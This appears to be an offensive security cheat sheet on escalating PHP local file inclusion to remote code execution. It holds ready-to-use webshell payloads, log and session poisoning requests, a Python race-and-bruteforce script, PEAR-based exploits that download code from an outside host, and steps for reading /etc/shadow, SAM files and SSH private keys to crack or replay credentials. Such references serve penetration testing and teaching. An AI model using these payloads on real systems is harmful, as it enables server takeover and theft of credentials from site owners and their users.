# LFI to RCE

> LFI (Local File Inclusion) is a vulnerability that occurs when a web application includes files from the local file system, often due to insecure handling of user input. If an attacker can control the file path, they can potentially include sensitive or dangerous files such as system files (/etc/passwd), configuration files, or even malicious files that could lead to Remote Code Execution (RCE).

## Summary 

- [LFI to RCE via /proc/*/fd](#lfi-to-rce-via-procfd)
- [LFI to RCE via /proc/self/environ](#lfi-to-rce-via-procselfenviron)
- [LFI to RCE via iconv](#lfi-to-rce-via-iconv)
- [LFI to RCE via upload](#lfi-to-rce-via-upload)
- [LFI to RCE via upload (race)](#lfi-to-rce-via-upload-race)
- [LFI to RCE via upload (FindFirstFile)](#lfi-to-rce-via-upload-findfirstfile)
- [LFI to RCE via phpinfo()](#lfi-to-rce-via-phpinfo)
- [LFI to RCE via controlled log file](#lfi-to-rce-via-controlled-log-file)
    - [RCE via SSH](#rce-via-ssh)
    - [RCE via Mail](#rce-via-mail)
    - [RCE via Apache logs](#rce-via-apache-logs)
- [LFI to RCE via PHP sessions](#lfi-to-rce-via-php-sessions)
- [LFI to RCE via PHP PEARCMD](#lfi-to-rce-via-php-pearcmd)
- [LFI to RCE via Credentials Files](#lfi-to-rce-via-credentials-files)


## LFI to RCE via /proc/*/fd

1. Upload a lot of shells (for example : 100)
2. Include `/proc/$PID/fd/$FD` where `$PID` is the PID of the process and `$FD` the filedescriptor. Both of them can be bruteforced.

```ps1
http://example.com/index.php?page=/proc/$PID/fd/$FD
```

## LFI to RCE via /proc/self/environ

Like a log file, send the payload in the `User-Agent` header, it will be reflected inside the `/proc/self/environ` file

```powershell
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```


## LFI to RCE via iconv

Use the iconv wrapper to trigger an OOB in the glibc (CVE-2024-2961), then use your LFI to read the memory regions from `/proc/self/maps` and to download the glibc binary. Finally you get the RCE by exploiting the `zend_mm_heap` structure to call a `free()` that have been remapped to `system` using `custom_heap._free`.


**Requirements**:

* PHP 7.0.0 (2015) to 8.3.7 (2024)
* GNU C Library (`glibc`) <=  2.39
* Access to `convert.iconv`, `zlib.inflate`, `dechunk` filters

**Exploit**:

* [ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits/tree/main)


## LFI to RCE via upload

If you can upload a file, just inject the shell payload in it (e.g : `<?php system($_GET['c']); ?>` ).

```powershell
http://example.com/index.php?page=path/to/uploaded/file.png
```

In order to keep the file readable it is best to inject into the metadata for the pictures/doc/pdf


## LFI to RCE via upload (race)

* Upload a file and trigger a self-inclusion.
* Repeat the upload a shitload of time to:
* increase our odds of winning the race
* increase our guessing odds
* Bruteforce the inclusion of /tmp/[0-9a-zA-Z]{6}
* Enjoy our shell.

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```


## LFI to RCE via upload (FindFirstFile)

:warning: Only works on Windows

`FindFirstFile` allows using masks (`<<` as `*` and `>` as `?`) in LFI paths on Windows. A mask is essentially a search pattern that can include wildcard characters, allowing users or developers to search for files or directories based on partial names or types. In the context of FindFirstFile, masks are used to filter and match the names of files or directories.

* `*`/`<<` : Represents any sequence of characters.
* `?`/`>` : Represents any single character.

Upload a file, it should be stored in the temp folder `C:\Windows\Temp\` with a generated name like `php[A-F0-9]{4}.tmp`.
Then either bruteforce the 65536 filenames or use a wildcard character like: `http://site/vuln.php?inc=c:\windows\temp\php<<`


## LFI to RCE via phpinfo()

PHPinfo() displays the content of any variables such as **$_GET**, **$_POST** and **$_FILES**.

> By making multiple upload posts to the PHPInfo script, and carefully controlling the reads, it is possible to retrieve the name of the temporary file and make a request to the LFI script specifying the temporary file name.

Use the script [phpInfoLFI.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)

Research from https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf


## LFI to RCE via controlled log file

Just append your PHP code into the log file by doing a request to the service (Apache, SSH..) and include the log file.

```powershell
http://example.com/index.php?page=/var/log/apache/access.log
http://example.com/index.php?page=/var/log/apache/error.log
http://example.com/index.php?page=/var/log/apache2/access.log
http://example.com/index.php?page=/var/log/apache2/error.log
http://example.com/index.php?page=/var/log/nginx/access.log
http://example.com/index.php?page=/var/log/nginx/error.log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/var/log/httpd/error_log
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```


### RCE via SSH

Try to ssh into the box with a PHP code as username `<?php system($_GET["cmd"]);?>`.

```powershell
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
```

Then include the SSH log files inside the Web Application.

```powershell
http://example.com/index.php?page=/var/log/auth.log&cmd=id
```


### RCE via Mail

First send an email using the open SMTP then include the log file located at `http://example.com/index.php?page=/var/log/mail`.

```powershell
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.
```

In some cases you can also send the email with the `mail` command line.

```powershell
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
```


### RCE via Apache logs

Poison the User-Agent in access logs:

```
$ curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.

```
$ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```


## LFI to RCE via PHP sessions

Check if the website use PHP Session (PHPSESSID)

```javascript
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

In PHP these sessions are stored into /var/lib/php5/sess_[PHPSESSID] or /var/lib/php/sessions/sess_[PHPSESSID] files

```javascript
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```

Set the cookie to `<?php system('cat /etc/passwd');?>`

```powershell
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

Use the LFI to include the PHP session file

```powershell
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```


## LFI to RCE via PHP PEARCMD

PEAR is a framework and distribution system for reusable PHP components. By default `pearcmd.php` is installed in every Docker PHP image from [hub.docker.com](https://hub.docker.com/_/php) in `/usr/local/lib/php/pearcmd.php`. 

The file `pearcmd.php` uses `$_SERVER['argv']` to get its arguments. The directive `register_argc_argv` must be set to `On` in PHP configuration (`php.ini`) for this attack to work.

```ini
register_argc_argv = On
```

There are this ways to exploit it.

* **Method 1**: config create
  ```ps1
  /vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
  /vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();
  ```

* **Method 2**: man_dir
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
  /vuln.php?file=/tmp/exec.php&c=id
  ```
  The created configuration file contains the webshell.
  ```php
  #PEAR_Config 0.9
  a:2:{s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}s:7:"man_dir";s:29:"<?echo(system($_GET['c']));?>";}
  ```

* **Method 3**: download (need external network connection).
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
  /vuln.php?file=exec.php&c=id
  ```

* **Method 4**: install (need external network connection). Notice that `exec.php` locates at `/tmp/pear/download/exec.php`.
  ```ps1
  /vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
  /vuln.php?file=/tmp/pear/download/exec.php&c=id
  ```


## LFI to RCE via credentials files

This method require high privileges inside the application in order to read the sensitive files.


### Windows version

Extract `sam` and `system` files.

```powershell
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

Then extract hashes from these files `samdump2 SYSTEM SAM > hashes.txt`, and crack them with `hashcat/john` or replay them using the Pass The Hash technique.


### Linux version

Extract `/etc/shadow` files.

```powershell
http://example.com/index.php?page=../../../../../../etc/shadow
```

Then crack the hashes inside in order to login via SSH on the machine.

Another way to gain SSH access to a Linux machine through LFI is by reading the private SSH key file: `id_rsa`.
If SSH is active, check which user is being used in the machine by including the content of `/etc/passwd` and try to access `/<HOME>/.ssh/id_rsa` for every user with a home.


## References

* [LFI2RCE via PHP Filters - HackTricks - 19/07/2024](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)
* [Local file inclusion tricks - Johan Adriaans - August 4, 2007](http://devels-playground.blogspot.fr/2007/08/local-file-inclusion-tricks.html)
* [PHP LFI to arbitrary code execution via rfc1867 file upload temporary files (EN) - Gynvael Coldwind - March 18, 2011](https://gynvael.coldwind.pl/?id=376)
* [PHP LFI with Nginx Assistance - Bruno Bierbaumer - 26 Dec 2021](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)
* [Upgrade from LFI to RCE via PHP Sessions - Reiners - September 14, 2017](https://web.archive.org/web/20170914211708/https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/)